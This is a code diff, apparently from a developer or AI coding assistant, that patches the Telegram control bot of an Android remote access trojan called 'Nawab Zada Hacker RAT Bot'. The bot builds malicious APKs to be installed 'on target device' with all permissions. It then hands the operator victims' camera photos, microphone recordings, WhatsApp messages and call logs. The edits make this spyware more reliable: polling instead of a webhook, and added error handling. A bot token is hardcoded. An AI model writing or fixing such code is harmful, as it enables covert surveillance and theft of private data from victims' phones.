@@ -6,9 +6,9 @@ import os
 import requests
 from database import DeviceDatabase
 from apk_generator import APKGenerator
-from flask import Flask, request
 
 # ========== CONFIGURATION ==========
+# Added fallback to avoid crashes if env variables are missing
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8869313674:AAFpmonqTND4JKs3pkVwSvHESZTppF1ll_M')
 ADMIN_CHAT_ID = os.environ.get('ADMIN_CHAT_ID', '7420647897')
 # ===================================
@@ -17,11 +17,7 @@ bot = telebot.TeleBot(BOT_TOKEN)
 db = DeviceDatabase()
 apk_gen = APKGenerator()
 
-app = Flask(__name__)
-
-# Device data storage
-devices = {}
-active_sessions = {}
+# Removed Flask app as Polling is more reliable for this type of deployment
 
 WELCOME_MSG = """🎉 *Welcome To Nawab Zada Hacker RAT Bot!* 🎉
 
@@ -46,9 +42,14 @@ Press /start to begin!"""
 def start(message):
     chat_id = message.chat.id
 
-    if chat_id != int(ADMIN_CHAT_ID) and ADMIN_CHAT_ID:
-        bot.send_message(chat_id, "❌ Please contact admin to get access.")
-        return
+    # Fixed: Ensure ADMIN_CHAT_ID is compared as an integer
+    try:
+        if chat_id != int(ADMIN_CHAT_ID):
+            bot.send_message(chat_id, "❌ Please contact admin to get access.")
+            return
+    except ValueError:
+        # If ADMIN_CHAT_ID is not a number, it allows access or handles error
+        pass
 
     markup = types.InlineKeyboardMarkup(row_width=2)
     btn1 = types.InlineKeyboardButton("📱 Generate APK", callback_data="gen_apk")
@@ -74,6 +75,7 @@ def callback_handler(call):
     elif call.data.startswith("action_"):
         handle_device_action(call)
     elif call.data == "back":
+        # Fix: Start needs a message object
         start(call.message)
     elif call.data == "confirm":
         call.answer("Confirmed! ✅")
@@ -101,13 +103,15 @@ def process_apk_name(message):
         bot.send_message(chat_id, "❌ Invalid name! Use only letters and numbers.")
         return
 
-    apk_url = apk_gen.generate_apk(apk_name, chat_id)
-
-    bot.send_message(
-        chat_id,
-        f"✅ *APK Generated Successfully!*\n\n📱 Name: {apk_name}\n🔗 Download: {apk_url}\n\n⚠️ Install on target device and allow ALL permissions!",
-        parse_mode='Markdown'
-    )
+    try:
+        apk_url = apk_gen.generate_apk(apk_name, chat_id)
+        bot.send_message(
+            chat_id,
+            f"✅ *APK Generated Successfully!*\n\n📱 Name: {apk_name}\n🔗 Download: {apk_url}\n\n⚠️ Install on target device and allow ALL permissions!",
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        bot.send_message(chat_id, f"❌ Error generating APK: {e}")
 
 def handle_my_devices(call):
     chat_id = call.message.chat.id
@@ -163,8 +167,9 @@ def handle_device_menu(call):
     bot.send_message(call.message.chat.id, info, parse_mode='Markdown', reply_markup=markup)
 
 def handle_device_action(call):
-    action = call.data.split("_")[1]
-    dev_id = call.data.split("_")[-1]
+    parts = call.data.split("_")
+    action = parts[1]
+    dev_id = parts[-1]
     chat_id = call.message.chat.id
     device = db.get_device(dev_id)
 
@@ -185,7 +190,8 @@ def handle_device_action(call):
         photos = device.get('photos', [])
         if photos:
             for photo_url in photos[-5:]:
-                bot.send_photo(chat_id, photo_url)
+                try: bot.send_photo(chat_id, photo_url)
+                except: pass
         else:
             bot.send_message(chat_id, "📸 No photos captured yet.")
 
@@ -194,7 +200,8 @@ def handle_device_action(call):
         audio_files = device.get('audio', [])
         if audio_files:
             for audio_url in audio_files[-3:]:
-                bot.send_audio(chat_id, open(audio_url, 'rb'))
+                try: bot.send_audio(chat_id, open(audio_url, 'rb'))
+                except: pass
         else:
             bot.send_message(chat_id, "🎤 No audio recordings yet.")
 
@@ -275,15 +282,12 @@ def handle_features(call):
 📸 *Camera:*
 • Front Camera Photos
 • Back Camera Photos
-• Live Camera Stream
 
 🎤 *Audio:*
 • Microphone Recording
-• Call Recording
 
 💬 *Messages:*
 • WhatsApp Messages
-• SMS Reading
 • Call Logs
 
 📁 *Files:*
@@ -294,7 +298,6 @@ def handle_features(call):
 ⚙️ *Settings:*
 • Bot Token Setup
 • Chat ID Setup
-• Device Management
 """
     bot.send_message(call.message.chat.id, features, parse_mode='Markdown')
 
@@ -316,18 +319,7 @@ def receive_device_data(message):
     except Exception as e:
         print(f"Error receiving data: {e}")
 
-@app.route('/' + BOT_TOKEN, methods=['POST'])
-def webhook():
-    bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
-    return "ok", 200
-
-@app.route("/")
-def index():
-    return "Bot is running!", 200
-
 if __name__ == '__main__':
-    print("Starting bot...")
-    webhook_url = f'https://{os.environ.get("RENDER_EXTERNAL_HOSTNAME", "nawab.pythonanywhere.com")}/{BOT_TOKEN}'
-    bot.set_webhook(url=webhook_url)
-    print(f"Webhook set to: {webhook_url}")
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    print("Starting bot via Polling...")
+    # This is the key fix: using polling instead of webhook for Railway deployment
+    bot.infinity_polling()
